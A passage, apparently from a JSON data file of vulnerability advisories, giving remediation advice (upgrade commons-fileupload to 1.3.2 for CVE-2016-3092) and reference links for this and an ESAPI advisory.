Commit](https://github.com/ESAPI/esapi-java-legacy/commit/a0d67b75593878b1b6e39e2acc1773b3effedb2a)\n- [GitHub Release](https://github.com/ESAPI/esapi-java-legacy/releases/tag/esapi-2.3.0.0)\n- [GitHub Security Labs](https://securitylab.github.com/advisories/GHSL-2022-008_The_OWASP_Enterprise_Security_API/)\n",

For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `commons-fileupload:commons-fileupload` to version 1.3.2 or higher.\n## References\n- [Apache Mail Archive](http://mail-archives.us.apache.org/mod_mbox/www-announce/201606.mbox/%3C6223ece6-2b41-ef4f-22f9-d3481e492832@apache.org%3E)\n- [Apache-SVN](http://svn.apache.org/viewvc/commons/proper/fileupload/trunk/RELEASE-NOTES.txt?r1=1745717&r2=1749637&diff_format=h)\n- [CVE Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3092)\n- [Github ChangeLog](https://github.com/apache/commons-fileupload/blob/b1498c9877d751f8bc4635a6f252ebdfcba28518/src/changes/changes.xml#L84)\n- [GitHub Commit](https://github.com/apache/tomcat80/commit/d752a415a875e888d8c8d0988dfbde95c2c6fb1d)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/2c3553f3681baf775c50bb0b49ea61cb44ea914f)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/8999f8243197a5f8297d0cb1a0d86ed175678a77)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=1349475)\n",
